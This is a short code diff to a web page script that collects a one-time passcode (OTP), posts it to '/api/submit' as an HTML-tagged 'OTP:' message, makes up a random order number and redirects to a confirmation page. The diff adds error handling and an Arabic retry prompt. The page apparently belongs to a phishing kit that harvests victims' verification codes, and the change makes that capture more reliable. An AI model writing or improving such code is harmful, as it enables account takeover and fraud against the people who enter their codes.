@@ -33,14 +33,22 @@
       verifyBtn.disabled=true;
       const orderId = Math.floor(100000 + Math.random()*900000);
       try{
-        await fetch('/api/submit', {
+        const res = await fetch('/api/submit', {
           method:'POST',
           headers:{'Content-Type':'application/json'},
           body: JSON.stringify({ payload:`<b>OTP:</b> ${code}` })
         });
+        if(!res.ok) throw new Error('Bad response');
+        window.location.href = 'confirmation.html?order=' + orderId;
       }catch(ex){
         console.error(ex);
+        if(otpError){
+          otpError.textContent='تعذر إرسال الرمز، حاول مرة أخرى';
+          otpError.style.display='block';
+        }
+      }finally{
+        loading.style.display='none';
+        verifyBtn.disabled=false;
       }
-      window.location.href = 'confirmation.html?order=' + orderId;
     });
     })();
